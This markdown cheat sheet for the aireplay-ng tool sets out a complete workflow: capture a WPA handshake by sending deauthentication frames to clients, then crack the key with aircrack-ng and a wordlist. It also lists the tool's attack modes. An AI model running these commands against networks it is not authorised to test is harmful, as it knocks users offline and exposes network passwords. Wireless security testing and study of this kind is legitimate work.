# aireplay-ng

Used to inject/replay frames. The primary function is to generate traffic for later use in aircrack-ng for cracking the WEP and WPA-PSK keys. For example, looking for the four-way handshake message during a deauthentication injection tests. Make sure that both the BSSID and CHANNEL are set correctly prior to injections.

Here's the normal workflow.

```bash
sudo airmon-ng -c $CHANNEL wlan0

# Terminal 1
sudo airodump-ng -c $CHANNEL --bssid $BSSID --output-format pcap -w $TAG wlan0mon

# Terminal 2
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon

# Wait for found handshake message from airodump-ng then stop everything

# Crack the key
sudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP
```

## Commands

```bash
# Test if injection works for given interface
sudo aireplay-ng --test wlan0mon

# Test injection between two interfaces
sudo aireplay-ng --test -i wlan1mon wlan0mon

# Test injection in a specific AP
sudo aireplay-ng -e $SSID -a $BSSID wlan0mon

# Test injection in a specific AP without expecting to receive probes
sudo aireplay-ng -e $SSID -a $BSSID -D wlan0mon

# Deauthenticate a specific client connected to an AP
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT wlan0mon

# Deauthenticate ALL clients connected to an AP
sudo aireplay-ng --deauth 7 -a $BSSID wlan0mon
```


## Attack Modes

```bash
aireplay-ng --help

Attack modes (numbers can still be used):

    --deauth      count : deauthenticate 1 or all stations (-0)
    --fakeauth    delay : fake authentication with AP (-1)
    --interactive       : interactive frame selection (-2)
    --arpreplay         : standard ARP-request replay (-3)
    --chopchop          : decrypt/chopchop WEP packet (-4)
    --fragment          : generates valid keystream   (-5)
    --caffe-latte       : query a client for new IVs  (-6)
    --cfrag             : fragments against a client  (-7)
    --migmode           : attacks WPA migration mode  (-8)
    --test              : tests injection and quality (-9)
```

## References

* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
